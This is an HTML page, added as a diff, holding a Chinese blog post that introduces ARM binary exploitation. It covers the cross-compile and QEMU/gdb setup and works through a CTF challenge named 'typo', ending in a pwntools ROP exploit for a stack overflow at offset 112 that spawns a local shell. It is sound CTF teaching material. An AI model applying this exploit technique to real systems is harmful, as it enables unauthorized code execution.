@@ -1,0 +1,693 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="gxh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1234title: ARMPWN入门categories: PWN    ARMPWN入门环境搭建 安装ARM软件包  12sudo apt-get install gcc-arm-linux-gnueabisudo apt-get install gcc-aarch64-linux-gnu   安装qume  1sudo apt-get install qemu-user qemu-syste">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gxh&#39;s blog">
+<meta property="og:url" content="http://gxher.github.io/2022/07/01/armpwn%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="gxh&#39;s blog">
+<meta property="og:description" content="1234title: ARMPWN入门categories: PWN    ARMPWN入门环境搭建 安装ARM软件包  12sudo apt-get install gcc-arm-linux-gnueabisudo apt-get install gcc-aarch64-linux-gnu   安装qume  1sudo apt-get install qemu-user qemu-syste">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/26505/AppData/Roaming/Typora/typora-user-images/image-20220630160649274.png">
+<meta property="og:image" content="c:/Users/26505/AppData/Roaming/Typora/typora-user-images/image-20220630161315850.png">
+<meta property="og:image" content="c:/Users/26505/AppData/Roaming/Typora/typora-user-images/image-20220630161410947.png">
+<meta property="og:image" content="c:/Users/26505/AppData/Roaming/Typora/typora-user-images/image-20220630161906789.png">
+<meta property="og:image" content="c:/Users/26505/AppData/Roaming/Typora/typora-user-images/image-20220630224228900.png">
+<meta property="og:image" content="c:/Users/26505/AppData/Roaming/Typora/typora-user-images/image-20220630225818049.png">
+<meta property="og:image" content="c:/Users/26505/AppData/Roaming/Typora/typora-user-images/image-20220630230826892.png">
+<meta property="article:published_time" content="2022-07-01T10:30:09.894Z">
+<meta property="article:modified_time" content="2022-07-01T10:34:44.552Z">
+<meta property="article:author" content="gxh">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:/Users/26505/AppData/Roaming/Typora/typora-user-images/image-20220630160649274.png">
+  
+  
+  
+  <title>gxh&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gxher.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>gxh&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/back.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-07-01 18:30" pubdate>
+          2022年7月1日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            <div class="markdown-body">
+              
+              <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-attr">title:</span> <span class="hljs-string">ARMPWN入门</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">PWN</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="ARMPWN入门"><a href="#ARMPWN入门" class="headerlink" title="ARMPWN入门"></a>ARMPWN入门</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>安装ARM软件包</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install gcc-arm-linux-gnueabi<br>sudo apt-get install gcc-aarch64-linux-gnu<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>安装qume</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install qemu-user qemu-system<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>安装gdb-multiarch</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install gdb-multiarch<br></code></pre></td></tr></table></figure>
+
+<h2 id="ubuntu编译arm架构程序并用qemu执行"><a href="#ubuntu编译arm架构程序并用qemu执行" class="headerlink" title="ubuntu编译arm架构程序并用qemu执行"></a>ubuntu编译arm架构程序并用qemu执行</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">编译</span><br>arm-linux-gcc -g easyarm.c -o eastgets<br><span class="hljs-meta prompt_">#</span><span class="language-bash">qemu执行 动态链接程序，需要指定libc的位置</span><br>qemu-arm -L /usr/arm-linux-gnueabihf/ ./pwn<br></code></pre></td></tr></table></figure>
+
+<h2 id="qemu调试arm用户态程序"><a href="#qemu调试arm用户态程序" class="headerlink" title="qemu调试arm用户态程序"></a>qemu调试arm用户态程序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用qemu-arm将程序运行起来，并指定一个端口用于连接gdb</span><br>qemu-arm -g xxx ./arm-bin<br>qemu-arm -L ./libc ./arm-bin（-L 参数可以指定libc的路径 可选）<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用gdb-multiarch指定arm程序</span><br>gdb-multiarch ./arm-bin<br><span class="hljs-meta prompt_">gef&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> architecture arm</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">gef&gt; <span class="hljs-built_in">set</span> endian little</span><br><span class="hljs-meta prompt_">gef&gt; </span><span class="language-bash">target remote :xxx</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">gdb-multiarch指定config文件</span><br>gdb-multiarch -x mygdb.cfg ./arm-bin<br></code></pre></td></tr></table></figure>
+
+<h2 id="qemu调试mips程序也一样"><a href="#qemu调试mips程序也一样" class="headerlink" title="qemu调试mips程序也一样"></a>qemu调试mips程序也一样</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">启动mips应用程序，并指定调试端口</span><br>qemu-mips -g xxx ./mips-bin<br>qemu-mips -g xxx -L ./ ./mips-bin  # 使用-L指定包含动态库的lib/目录<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">gdb-multiarch启动调试</span><br>gdb-multiatch ./mips-bin<br><span class="hljs-meta prompt_">gef&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> architecture mips</span><br><span class="hljs-meta prompt_">gef&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> endian big</span><br><span class="hljs-meta prompt_">gef&gt; </span><span class="language-bash">target remote :xxx</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="例题typo"><a href="#例题typo" class="headerlink" title="例题typo"></a>例题typo</h2><p>file指令查看文件相关数据：</p>
+<p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630160649274.png" srcset="/img/loading.gif" lazyload alt="image-20220630160649274"></p>
+<p>32bit，小端序，静态链接，arm架构</p>
+<p>运行程序试试：</p>
+<p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630161315850.png" srcset="/img/loading.gif" lazyload alt="image-20220630161315850"></p>
+<p>ida里，通过字符串交叉引用查询输入点所在位置：</p>
+<p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630161410947.png" srcset="/img/loading.gif" lazyload alt="image-20220630161410947"></p>
+<p>输入时，尝试输入大量数据，程序果然崩掉了</p>
+<p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630161906789.png" srcset="/img/loading.gif" lazyload alt="image-20220630161906789"></p>
+<p>pwndbg调试计算偏移量：</p>
+<p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630224228900.png" srcset="/img/loading.gif" lazyload alt="image-20220630224228900"></p>
+<p>存在栈溢出，偏移量112，然后直接进行ROP就可以了。</p>
+<p>找gadget:</p>
+<p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630225818049.png" srcset="/img/loading.gif" lazyload alt="image-20220630225818049"></p>
+<p>arm架构下32bit程序，函数的前四个参数分别保存在r0~r3寄存器中，其余的参数在栈中，函数返回值保存在寄存器r0中。所以构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./typo&quot;</span>)<br>context(arch = <span class="hljs-string">&#x27;arm&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p_r0_r4_pc = <span class="hljs-number">0x00020904</span><br><br>r.recvuntil(<span class="hljs-string">b&#x27;Input ~ if you want to quit&#x27;</span>)<br>r.sendline()<br>r.recvuntil(<span class="hljs-string">b&#x27;------Begin------&#x27;</span>)<br>pl1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(p_r0_r4_pc) + p32(<span class="hljs-number">0x0006C384</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x110B4</span>)<br>r.sendline(pl1)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630230826892.png" srcset="/img/loading.gif" lazyload alt="image-20220630230826892"></p>
+<p>总结：题目去了符号表真好恶心，明明蛮简单的一道题目，逆了好久。</p>
+<h2 id="一些arm的知识"><a href="#一些arm的知识" class="headerlink" title="一些arm的知识"></a>一些arm的知识</h2><p>arm32</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r0 	第一个参数和返回值 	 类似于eax<br>r1	第二个参数 		类似于ebx<br>r2	第三个参数 		类似于ecx<br>r3	第四个参数 		类似于edx<br>			大于四个参数，使用栈传参<br>r4-r10 	通用寄存器  		存储局部变量等		<br>r11/FP 	栈帧寄存器		类似于ebp<br>r12	保存立即数		一般用于保存立即数<br>SP 	栈顶寄存器		类似于esp<br>LR 	链接寄存器 		保存返回地址<br>PC 	程序计数器		保存当前执行地址<br></code></pre></td></tr></table></figure>
+
+<p>arm64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">X0-X7 	第1-7个参数和返回值	最多支持7个寄存器参数<br>X8-X18 	临时寄存器		<br>X19-X28 callee-saved寄存器	若使用需要保存原始值<br>X29 	栈帧寄存器		类似于ebp<br>X30 	链接寄存器		保存返回地址<br>SP 	栈顶寄存器		类似于esp<br>PC 	程序计数器		保存当前执行地址<br></code></pre></td></tr></table></figure>
+
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://gxher.github.io/2022/07/01/armpwn入门/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>gxh</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年7月1日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/01/largebin_attack/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/27/%E6%B4%9B%E8%B0%B7%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8day1/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/gxher?tab=repositories" target="_blank" rel="nofollow noopener"><span>Try your best!</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
